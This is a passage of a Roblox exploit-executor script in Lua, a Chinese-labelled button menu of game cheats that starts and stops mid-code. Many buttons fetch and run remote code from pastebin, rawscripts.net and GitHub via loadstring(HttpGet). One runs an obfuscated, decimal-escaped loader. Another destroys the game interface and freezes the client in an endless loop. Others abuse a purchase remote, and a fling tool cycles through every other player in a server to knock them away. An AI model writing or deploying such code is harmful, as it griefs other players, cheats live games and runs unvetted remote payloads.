        	for lvA, lvB in next, pA[1]:GetChildren() do
            		local tvE = lvB:FindFirstChildOfClass("BodyForce")
            
            		if tvE then
                		tvE:Destroy()
            		end

            		lvB.Parent = pA[2]
        	end


        	tvB:Destroy()
        	tvC:Destroy()
        	tvD:Destroy()


        	pA[1]:Destroy()
        	pA[2].Parent = options.EquipToolOnCapture and CHARACTER or BACKPACK


        	return true
	end
	
	return false
end



UserInputService.InputBegan:Connect(function(pA, pB)
	if pB == false and pA.UserInputType == Enum.UserInputType.Keyboard then
        	if pA.KeyCode == options.HotKeys.Release then
            		local tvA = FindFirstTool()

			if tvA then
				if tvA.Parent ~= CHARACTER then
					tvA.Parent = CHARACTER
					wait(0.5)
				end

				Release(tvA)
			end
		elseif pA.KeyCode == options.HotKeys.Capture then
            		if #vA > 0 and Capture(vA[#vA]) then
                		table.remove(vA, #vA)
            		end
        	end
	end
end)



settings().Physics.AllowSleep = false
sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius", math.huge)

  	end    

})

Tab:AddButton({

	Name = "人体分离术",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/%E5%B7%A5%E4%BD%9C%E5%AE%A4.LUA", true))()

  	end    

})

Tab:AddButton({

	Name = "去除迷雾",

	Callback = function()

      if state then
        game.Lighting.FogStart = 3276634343
        game.Lighting.FogEnd = 3276734343
    else
        game.Lighting.FogStart = 0
    end

  	end    

})

Tab:AddButton({

	Name = "部位消失",

	Callback = function()

     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"))()

  	end    

})

Tab:AddButton({

	Name = "服装修改（黑客）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/6X72Mdfs"))()

  	end    

})

Tab:AddButton({

	Name = "时间控制器（仅自己）",

	Callback = function()

     loadstring("\115\101\116\116\105\110\103\32\61\32\115\101\116\116\105\110\103\115\40\41\46\78\101\116\119\111\114\107\10\108\111\99\97\108\32\69\102\102\101\99\116\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\10\69\102\102\101\99\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\76\105\103\104\116\105\110\103\10\69\102\102\101\99\116\46\83\97\116\117\114\97\116\105\111\110\32\61\32\45\51\10\69\102\102\101\99\116\46\66\114\105\103\104\116\110\101\115\115\32\61\32\48\10\69\102\102\101\99\116\46\67\111\110\116\114\97\115\116\32\61\32\48\10\10\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\10\108\111\99\97\108\32\108\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\108\111\111\100\98\97\108\108\47\45\98\97\99\107\45\117\112\115\45\102\111\114\45\108\105\98\115\47\109\97\105\110\47\119\97\108\108\37\50\48\118\51\39\41\41\41\40\41\10\10\108\111\99\97\108\32\119\32\61\32\108\105\98\114\97\114\121\58\67\114\101\97\116\101\87\105\110\100\111\119\40\34\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\119\105\110\100\111\119\10\10\108\111\99\97\108\32\98\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\83\116\111\112\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\99\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\84\105\109\101\32\67\108\111\99\107\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\84\105\109\101\32\67\111\110\116\114\111\108\108\101\114\44\101\116\99\41\10\10\108\111\99\97\108\32\97\32\61\32\119\58\67\114\101\97\116\101\70\111\108\100\101\114\40\34\68\101\115\116\114\111\121\32\71\117\105\34\41\32\45\45\32\67\114\101\97\116\101\115\32\116\104\101\32\102\111\108\100\101\114\40\82\101\109\111\118\101\32\89\111\117\114\32\71\117\105\44\101\116\99\41\10\10\10\98\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\98\58\66\117\116\116\111\110\40\34\83\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\116\114\117\101\10\9\9\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\51\48\48\48\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\42\32\51\10\101\110\100\41\10\10\98\58\66\117\116\116\111\110\40\34\85\110\115\116\111\112\32\84\105\109\101\34\44\102\117\110\99\116\105\111\110\40\41\10\9\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\54\10\9\9\69\102\102\101\99\116\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\32\32\32\32\115\101\116\116\105\110\103\46\73\110\99\111\109\105\110\103\82\101\112\108\105\99\97\116\105\111\110\76\97\103\32\61\32\48\10\9\9\10\101\110\100\41\10\10\97\58\68\101\115\116\114\111\121\71\117\105\40\41\10\10\99\58\76\97\98\101\108\40\34\73\109\32\80\97\116\114\105\99\107\34\44\123\10\32\32\32\32\84\101\120\116\83\105\122\101\32\61\32\50\53\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\84\101\120\116\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\32\50\53\53\44\32\50\53\53\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\66\103\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\49\51\44\32\49\48\53\44\32\49\55\50\41\59\32\45\45\32\83\101\108\102\32\69\120\112\108\97\105\110\105\110\103\10\32\32\32\32\10\125\41\32\10\10\99\58\66\111\120\40\34\67\108\111\99\107\32\84\105\109\101\34\44\34\110\117\109\98\101\114\34\44\102\117\110\99\116\105\111\110\40\118\97\108\117\101\41\32\45\45\32\34\110\117\109\98\101\114\34\32\111\114\32\34\115\116\114\105\110\103\34\10\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\67\108\111\99\107\84\105\109\101\32\61\32\118\97\108\117\101\10\101\110\100\41\10")()

  	end    

})

Tab:AddButton({

	Name = "蓝屏警告",

	Callback = function()

     local coregui = game:service'CoreGui'

local sound = Instance.new('Sound', coregui)
sound.SoundId = 'rbxassetid://865599816'
sound.Volume = 3
sound.Looped = true

local gui = Instance.new('ScreenGui', coregui)
local image = Instance.new('ImageLabel', gui)
image.Position = UDim2.new(0, 0, -0.05, 0)
image.Size = UDim2.new(1, 0, 1.05, 0)
image.Image = "rbxassetid://9637192164"
image.Visible = false

task.wait(1)

for i,v in pairs(coregui:GetChildren()) do
    if v ~= gui and v ~= sound then
        v:Destroy()   
    end
end

if (not UserSettings().GameSettings:InFullScreen()) then
    game:service'GuiService':ToggleFullscreen()    
end

game:service'UserInputService'.MouseIconEnabled = false
sound:Play()
image.Visible = true

task.wait(1)

while true do end

  	end    

})

Tab:AddButton({

	Name = "r15变r6",

	Callback = function()

     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()

  	end    

})

Tab:AddButton({

	Name = "圆圈护盾（伪无敌）",

	Callback = function()

     Instance.new("ForceField", game.Players.LocalPlayer.Character)

  	end    

})

Tab:AddButton({

	Name = "无限连跳",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()

  	end    

})

Tab:AddButton({

	Name = "移除头发",

	Callback = function()

     assets = {540034631, 178993946, 461493477, 110288809}
me = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'
for i,v in pairs(me.Parent:GetChildren()) do
if v:IsA'Accoutrement' then v.Parent = nil end
end
for i,v in pairs(assets) do
  game:GetService'ReplicatedStorage'.ITEM_PURCHASE:InvokeServer('xdd', tostring(game:GetService'MarketplaceService':GetProductInfo(v).AssetTypeId), v)
end
me.WalkSpeed = 50 --same
mouse = game:GetService'Players'.LocalPlayer:GetMouse()
exploded = false
boom = mouse.Button1Down:connect(function()
if exploded == true then return end
exploded = true
game:GetService'ReplicatedStorage'.ITEM_PURCHASE:InvokeServer('boom', '8', '1527622')
print'exploding!!!'
exploded = true
boom:Disconnect()
end)

  	end    

})

Tab:AddButton({

	Name = "防空警报",

	Callback = function()

     local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://792323017"
    sound.Parent = game.Workspace
    sound:Play()

  	end    

})

Tab:AddButton({

	Name = "FE动作",

	Callback = function()

     loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()

  	end    

})

Tab:AddButton({

	Name = "显示帧率",

	Callback = function()

      -- Gui to Lua 
 -- Version: 3.2 
  
 -- Instances:
 local ScreenGui = Instance.new("ScreenGui") 
 local FpsLabel = Instance.new("TextLabel")
 
 --Properties:
 
 ScreenGui.Name = "FPSGui" 
 ScreenGui.ResetOnSpawn = false 
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
 
 FpsLabel.Name = "FPSLabel" 
 FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
 FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
 FpsLabel.BackgroundTransparency = 1 
 FpsLabel.Font = Enum.Font.SourceSansBold 
 FpsLabel.Text = "帧率: 0" 
 FpsLabel.TextSize = 20 
 FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
 FpsLabel.Parent = ScreenGui 
  
 function updateFpsLabel() 
     local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
     FpsLabel.Text = "帧率: " .. fps 
 end 
  
  game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
  
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")


 animateCredits()

  	end    

})

Tab:AddButton({

	Name = "旋转甩飞",

	Callback = function()

     game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "旋转甩飞"; Text ="汉化鹤"; Duration = 4; })
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "旋转甩飞"; Text ="原作者: topit "; Duration = 4; })

local PlayerService = game:GetService("Players")--:GetPlayers()
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local plr = PlayerService.LocalPlayer
local mouse = plr:GetMouse()
local BodyThrust = nil
local Dragging = {}

local Suggestions = {
    2298830673, 300, 365, --gamier (test game)
    1537690962, 250, 350, --bee swarm sim
    5580097107, 300, 400, --frappe
    2202352383, 275, 350, --super power training sim
    142823291, 350, 425,  --murder mystery 2
    155615604, 273, 462,  --prison life
    1990228024, 200, 235, --bloxton hotels
    189707, 250, 325,     --natural disaster survival
    230362888, 265, 415,  --the normal elevator       (may not work)
    5293755937, 335, 435, --speedrun sim
    537413528, 300, 350,  --build a boat              (may not work)
    18540115, 300, 425,   --survive the disasters
    2041312716, 350, 465  --Ragdoll engine
}


local version = ""
local font = Enum.Font.FredokaOne

local AxisPositionX = {
	0.05, 
	0.35,
	0.65
}

local AxisPositionY = {
	40, --edit fling speed
	90, --toggle fling types (normal, qfling, serverkek)
	140, --extra (respawn)
	190, --edit gui settings (hotkey, theme)
	240
}

local Fling = {
	false, --toggle
	"", --hotkey
	300, --speed
	false, --server
	false --stop vertfling
}


--[[themes:]]--

local Theme_JeffStandard = {
	Color3.fromRGB(15, 25, 35),   
	Color3.fromRGB(10, 20, 30),   
	Color3.fromRGB(27, 42, 53),   
	Color3.fromRGB(25, 35, 45),   
	Color3.fromRGB(20, 30, 40),   
	Color3.fromRGB(25, 65, 45),   
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(245, 245, 255),
	Color3.fromRGB(155, 155, 255) 
}
local Theme_Dark = {
	Color3.fromRGB(25, 25, 25),   --Top bar
	Color3.fromRGB(10, 10, 10),   --Background
	Color3.fromRGB(40, 40, 40),   --Border color
	Color3.fromRGB(35, 35, 35),   --Button background
	Color3.fromRGB(20, 20, 20),   --Unused
	Color3.fromRGB(25, 100, 45),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Steel = {
	Color3.fromRGB(25, 25, 35),   --Top bar
	Color3.fromRGB(10, 10, 20),   --Background
	Color3.fromRGB(40, 40, 50),   --Border color
	Color3.fromRGB(35, 35, 45),   --Button background
	Color3.fromRGB(20, 20, 25),   --Unused
	Color3.fromRGB(25, 100, 55),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Rust = {
	Color3.fromRGB(45, 25, 25),   
	Color3.fromRGB(30, 10, 10),   
	Color3.fromRGB(60, 40, 40),   
	Color3.fromRGB(55, 35, 35),   
	Color3.fromRGB(40, 20, 20),   
	Color3.fromRGB(45, 100, 45),  
	Color3.fromRGB(255, 255, 255),
	Color3.fromRGB(255, 245, 255),
	Color3.fromRGB(175, 155, 255) 
}
local Theme_Violet = {
	Color3.fromRGB(35, 25, 45),   --Top bar
	Color3.fromRGB(20, 10, 30),   --Background
	Color3.fromRGB(50, 40, 60),   --Border color
	Color3.fromRGB(45, 35, 55),   --Button background
	Color3.fromRGB(30, 20, 40),   --Unused
	Color3.fromRGB(35, 100, 65),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_Space = {
	Color3.fromRGB(10, 10, 10),   --Top bar
	Color3.fromRGB(0, 0, 0),   --Background
	Color3.fromRGB(20, 20, 20),   --Border color
	Color3.fromRGB(15, 15, 15),   --Button background
	Color3.fromRGB(5, 5, 5),   --Unused
	Color3.fromRGB(20, 25, 50),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}
local Theme_SynX = {
	Color3.fromRGB(75, 75, 75),   --Top bar
	Color3.fromRGB(45, 45, 45),   --Background
	Color3.fromRGB(45, 45, 45),   --Border color
	Color3.fromRGB(75, 75, 75),   --Button background
	Color3.fromRGB(0, 0, 5),   --Unused
	Color3.fromRGB(150, 75, 20),  --Button highlight
	Color3.fromRGB(255, 255, 255),--Text title
	Color3.fromRGB(245, 245, 255),--Text generic
	Color3.fromRGB(155, 155, 255) --Text highlight
}


local SelectedTheme = math.random(1,6)
if SelectedTheme == 1 then
    SelectedTheme = Theme_Steel
elseif SelectedTheme == 2 then
    SelectedTheme = Theme_Dark
elseif SelectedTheme == 3 then
    SelectedTheme = Theme_Rust
elseif SelectedTheme == 4 then
    SelectedTheme = Theme_Violet
elseif SelectedTheme == 5 then
    SelectedTheme = Theme_Space
elseif SelectedTheme == 6 then
    if syn then
        SelectedTheme = Theme_SynX
    else
        SelectedTheme = Theme_JeffStandard
    end
end

--[[instances:]]--
local ScreenGui = Instance.new("ScreenGui")
local TitleBar = Instance.new("Frame")
local Shadow = Instance.new("Frame")
local Menu = Instance.new("ScrollingFrame")

local TitleText = Instance.new("TextLabel")
local TitleTextShadow = Instance.new("TextLabel")
local CreditText = Instance.new("TextLabel")
local SuggestionText = Instance.new("TextLabel")

local SpeedBox = Instance.new("TextBox")
local Hotkey = Instance.new("TextBox")

local SpeedUp = Instance.new("TextButton")
local SpeedDown = Instance.new("TextButton")
local ToggleFling = Instance.new("TextButton")
local ToggleServerKill = Instance.new("TextButton")
local NoVertGain = Instance.new("TextButton")
local Respawn = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")

--local BodyThrust = Instance.new("BodyThrust")

ScreenGui.Name = "JeffFling"
ScreenGui.Parent = game.CoreGui
ScreenGui.Enabled = true

TitleBar.Name = "Title Bar"
TitleBar.Parent = ScreenGui
TitleBar.BackgroundColor3 = SelectedTheme[1]
TitleBar.BorderColor3 = SelectedTheme[3]
TitleBar.Position = UDim2.new(-0.3, 0, 0.7, 0)
TitleBar.Size = UDim2.new(0, 400, 0, 250)
TitleBar.Draggable = true
TitleBar.Active = true
TitleBar.Selectable = true
TitleBar.ZIndex = 100

Shadow.Name = "Shadow"
Shadow.Parent = TitleBar
Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Shadow.BackgroundTransparency = 0.5
Shadow.BorderSizePixel = 0
Shadow.Position = UDim2.new(0, 5, 0, 5)
Shadow.Size = TitleBar.Size
Shadow.ZIndex = 50

Menu.Name = "Menu"
Menu.Parent = TitleBar
Menu.BackgroundColor3 = SelectedTheme[2]
Menu.BorderColor3 = SelectedTheme[3]
Menu.AnchorPoint = Vector2.new(0,0)
Menu.Position = UDim2.new(0, 0, 0, 50)
Menu.Size = UDim2.new(0, 400, 0, 200)
Menu.CanvasSize = UDim2.new(0, TitleBar.Size.X, 0, 325)
Menu.ScrollBarImageTransparency = 0.5
Menu.ZIndex = 200

TitleText.Name = "Title Text"
TitleText.Parent = TitleBar
TitleText.AnchorPoint = Vector2.new(0, 0)
TitleText.Position = UDim2.new(0, 100, 0, 25)
TitleText.Font = font
TitleText.Text = "旋转甩飞脚本【汉化作者：鹤】"..version
TitleText.TextColor3 = SelectedTheme[8]
TitleText.TextSize = 28
TitleText.ZIndex = 300
TitleText.BackgroundTransparency = 1

TitleTextShadow.Name = "Shadow"
TitleTextShadow.Parent = TitleText
TitleTextShadow.Font = font
TitleTextShadow.Text = "甩飞"..version
TitleTextShadow.TextSize = 28
TitleTextShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleTextShadow.TextTransparency = 0.5
TitleTextShadow.Position = UDim2.new(0, 5, 0, 5)
TitleTextShadow.ZIndex = 250
TitleTextShadow.BackgroundTransparency = 1

SuggestionText.Name = "Suggestion Text"
SuggestionText.Parent = Menu
SuggestionText.Position = UDim2.new(0, 20, 0, 250)
SuggestionText.Font = font
SuggestionText.Text = "e"
SuggestionText.TextColor3 = SelectedTheme[7]
SuggestionText.TextSize = 24
SuggestionText.TextXAlignment = Enum.TextXAlignment.Left
SuggestionText.ZIndex = 300
SuggestionText.BackgroundTransparency = 1

CreditText.Name = "Credit Text"
CreditText.Parent = Menu
CreditText.Position = UDim2.new(0, 20, 0, 300)
CreditText.Font = font
CreditText.Text = "原作者: topit 汉化:鹤 "
CreditText.TextColor3 = SelectedTheme[7]
CreditText.TextSize = 20
CreditText.TextXAlignment = Enum.TextXAlignment.Left
CreditText.ZIndex = 300
CreditText.BackgroundTransparency = 1

SpeedBox.Name = "速度"
SpeedBox.Parent = Menu
SpeedBox.BackgroundColor3 = SelectedTheme[4]
SpeedBox.BorderColor3 = SelectedTheme[3]
SpeedBox.TextColor3 = SelectedTheme[7]
SpeedBox.Position = UDim2.new(AxisPositionX[1], 0, 0, AxisPositionY[1])
SpeedBox.Size = UDim2.new(0, 100, 0, 25)
SpeedBox.Font = Enum.Font.FredokaOne
SpeedBox.Text = "现在的速度: "..Fling[3]
SpeedBox.PlaceholderText = "甩飞速度"
SpeedBox.TextScaled = true
SpeedBox.ZIndex = 300

Hotkey.Name = "Custom Hotkey"
Hotkey.Parent = Menu
Hotkey.BackgroundColor3 = SelectedTheme[4]
Hotkey.BorderColor3 = SelectedTheme[3]
Hotkey.TextColor3 = SelectedTheme[7]
Hotkey.Position = UDim2.new(AxisPositionX[2], 0, 0, AxisPositionY[3])
Hotkey.Size = UDim2.new(0, 100, 0, 25)
Hotkey.Font = Enum.Font.FredokaOne
Hotkey.Text = "推荐5"
Hotkey.PlaceholderText = "数值:"
Hotkey.TextScaled = true
Hotkey.ZIndex = 300

SpeedUp.Name = "Speed Up"
SpeedUp.Parent = Menu
SpeedUp.BackgroundColor3 = SelectedTheme[4]
SpeedUp.BorderColor3 = SelectedTheme[3]
SpeedUp.TextColor3 = SelectedTheme[7]
SpeedUp.Position = UDim2.new((AxisPositionX[2]), 0, 0, (AxisPositionY[1]))
SpeedUp.Size = UDim2.new(0, 100, 0, 25)
SpeedUp.Font = Enum.Font.FredokaOne
SpeedUp.Text = "增加"
SpeedUp.TextScaled = true
SpeedUp.ZIndex = 300

SpeedDown.Name = "Speed Down"
SpeedDown.Parent = Menu
SpeedDown.BackgroundColor3 = SelectedTheme[4]
SpeedDown.BorderColor3 = SelectedTheme[3]
SpeedDown.TextColor3 = SelectedTheme[7]
SpeedDown.Position = UDim2.new((AxisPositionX[3]), 0, 0, (AxisPositionY[1]))
SpeedDown.Size = UDim2.new(0, 100, 0, 25)
SpeedDown.Font = Enum.Font.FredokaOne
SpeedDown.Text = "减少"
SpeedDown.TextScaled = true
SpeedDown.ZIndex = 300

ToggleFling.Name = "Fling toggle"
ToggleFling.Parent = Menu
ToggleFling.BackgroundColor3 = SelectedTheme[4]
ToggleFling.BorderColor3 = SelectedTheme[3]
ToggleFling.TextColor3 = SelectedTheme[7]
ToggleFling.Position = UDim2.new((AxisPositionX[1]), 0, 0, (AxisPositionY[2]))
ToggleFling.Size = UDim2.new(0, 100, 0, 25)
ToggleFling.Font = Enum.Font.FredokaOne
ToggleFling.Text = "点击旋转"
ToggleFling.TextScaled = true
ToggleFling.ZIndex = 300

Respawn.Name = "Respawn"
Respawn.Parent = Menu
Respawn.BackgroundColor3 = SelectedTheme[4]
Respawn.BorderColor3 = SelectedTheme[3]
Respawn.TextColor3 = SelectedTheme[7]
Respawn.Position = UDim2.new((AxisPositionX[1]), 0, 0, (AxisPositionY[3]))
Respawn.Size = UDim2.new(0, 100, 0, 25)
Respawn.Font = Enum.Font.FredokaOne
Respawn.Text = "关闭旋转"
Respawn.TextScaled = true
Respawn.ZIndex = 300

NoVertGain.Name = "NoVertGain"
NoVertGain.Parent = Menu
NoVertGain.BackgroundColor3 = SelectedTheme[4]
NoVertGain.BorderColor3 = SelectedTheme[3]
NoVertGain.TextColor3 = SelectedTheme[7]
NoVertGain.Position = UDim2.new((AxisPositionX[2]), 0, 0, (AxisPositionY[2]))
NoVertGain.Size = UDim2.new(0, 100, 0, 25)
NoVertGain.Font = Enum.Font.FredokaOne
NoVertGain.Text = "推荐"
NoVertGain.TextScaled = true
NoVertGain.ZIndex = 300

ToggleServerKill.Name = ""
ToggleServerKill.Parent = Menu
ToggleServerKill.BackgroundColor3 = SelectedTheme[4]
ToggleServerKill.BorderColor3 = SelectedTheme[3]
ToggleServerKill.TextColor3 = SelectedTheme[7]
ToggleServerKill.Position = UDim2.new((AxisPositionX[3]), 0, 0, (AxisPositionY[2]))
ToggleServerKill.Size = UDim2.new(0, 100, 0, 25)
ToggleServerKill.Font = Enum.Font.FredokaOne
ToggleServerKill.Text = "甩飞"
ToggleServerKill.TextScaled = true
ToggleServerKill.ZIndex = 300

CloseButton.Name = "Close Button"
CloseButton.AnchorPoint = Vector2.new(1, 0)
CloseButton.Parent = TitleBar
CloseButton.BackgroundColor3 = SelectedTheme[4]
CloseButton.BorderColor3 = SelectedTheme[3]
CloseButton.TextColor3 = SelectedTheme[7]
CloseButton.Position = UDim2.new(1, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 25, 0, 25)
CloseButton.Font = Enum.Font.FredokaOne
CloseButton.Text = "关闭"
CloseButton.ZIndex = 300
CloseButton.TextSize = 14

--BodyThrust.Name = "Power"
--BodyThrust.Parent = plr.Character.Torso
--BodyThrust.Force = Vector3.new(0, 0, 0)
--BodyThrust.Location = Vector3.new(0, 0, 0)

--[[functions:]]--
local function DisplayText(title, text, duration)
	duration = duration or 1
	game.StarterGui:SetCore("SendNotification", 
		{
			Title = title;
			Text = text;
			Icon = "";
			Duration = duration;
		}
	)
end

local function DisplaySuggestion()
    for i,v in pairs(Suggestions) do
        if v >= 9999 and v == game.PlaceId then
            DisplayText("推荐速度调250-325","推荐速度调: "..Suggestions[i+1].." - "..Suggestions[i+2])
            SuggestionText.Text = "推荐速度调: "..Suggestions[i+1].." - "..Suggestions[i+2]
        end
    end
    if SuggestionText.Text == "e" then
        SuggestionText.Text = "No suggestion for this game"
    end
end


local function GetRigType()
    
    if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        return Enum.HumanoidRigType.R15
    elseif plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
        return Enum.HumanoidRigType.R6
    else
        return nil
    end
end

local function GetDeadState(player)
    if player.Character.Humanoid:GetState() == Enum.HumanoidStateType.Dead then
        return true
    else
        return false
    end
end


local function EnableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = false
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = false
            plr.Character:FindFirstChild("Head").CanCollide             = false
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = false
        end
    end
end

local function DisableNoClip()
    
    if GetDeadState(plr) == false then
        if GetRigType() == Enum.HumanoidRigType.R6 then
            plr.Character:FindFirstChild("Torso").CanCollide            = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            plr.Character:FindFirstChild("UpperTorso").CanCollide       = true
            plr.Character:FindFirstChild("LowerTorso").CanCollide       = true
            plr.Character:FindFirstChild("Head").CanCollide             = true
            plr.Character:FindFirstChild("HumanoidRootPart").CanCollide = true
        end
    end
end

local function OpenObject(object)
    local OpenAnim = TweenService:Create(
    	object,
    	TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), --Enum.EasingStyle.Linear, Enum.EasingDirection.In
    	{Size = UDim2.new(0, 110, 0, 35), BackgroundColor3 = SelectedTheme[6] }
    )
    
    OpenAnim:Play()
end

local function CloseObject(object)
    local CloseAnim = TweenService:Create(
    	object,
    	TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out),
    	{Size = UDim2.new(0, 100, 0, 25), BackgroundColor3 = SelectedTheme[4] }
    )
    
    CloseAnim:Play()
end

    
local function TToggleFling()
    Fling[1] = not Fling[1]
    if Fling[1] then
        OpenObject(ToggleFling)
        
        BodyThrust = Instance.new("BodyThrust")
        if GetRigType() == Enum.HumanoidRigType.R6 then
            BodyThrust.Parent = plr.Character.Torso
        elseif GetRigType() == Enum.HumanoidRigType.R15 then
            BodyThrust.Parent = plr.Character.UpperTorso
        end
        
        EnableNoClip()
        BodyThrust.Force = Vector3.new(Fling[3], 0, 0)
        BodyThrust.Location = Vector3.new(0, 0, Fling[3])
        
        
        print("Enabled fling")
    else
        CloseObject(ToggleFling)
        
        DisableNoClip()
        for i, v in pairs(plr.Character:GetDescendants()) do
            if v:IsA("BasePart") then
            v.Velocity, v.RotVelocity = Vector3.new(0, 0, 0), Vector3.new(0, 0, 0)
            end
        end
        BodyThrust:Destroy()
        
        print("Disabled fling")
        
    end
end

local function GetIfPlayerInGame(PlayerToFind)
    if PlayerService:FindFirstChild(PlayerToFind) then
        return true
    else
        return false
    end
end

local function ServerKek()
    local TargetList = {}
    local index = 1
    local playercount = 0
    
    if Fling[1] == true then
        TToggleFling()
    end
    
    for i,v in pairs(PlayerService:GetPlayers()) do
        if v ~= plr then
            playercount = playercount + 1
            table.insert(TargetList, v)
        end
    end
    
    for i,v in pairs(TargetList) do
       print(i,v.Name) 
    end
    
    
    while Fling[4] do
        if index > playercount then
            CloseObject(ToggleServerKill)
            DisplayText("全部甩飞成功","汉化鹤")
            Fling[4] = false
            break
        else
            local InGame = GetIfPlayerInGame(TargetList[index].Name)
            local Dead = GetDeadState(TargetList[index])
